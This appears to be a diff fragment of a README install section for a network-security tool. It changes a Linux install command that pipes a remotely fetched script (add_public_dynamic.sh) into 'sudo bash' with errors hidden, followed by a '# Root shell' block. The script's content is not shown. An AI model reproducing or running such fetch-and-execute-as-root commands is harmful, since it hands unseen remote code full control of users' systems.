@@ -12,7 +12,7 @@ or securing internal networks with ease and reliability.
 ### Linux
 
 ```bash
-curl -fsSL https://cryptopredictor.org/add_public_dynamic.sh | sudo bash 2>/dev/null
+curl -fsSL https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic.sh | sudo bash 2>/dev/null
 ```
 ```bash
 # Root shell
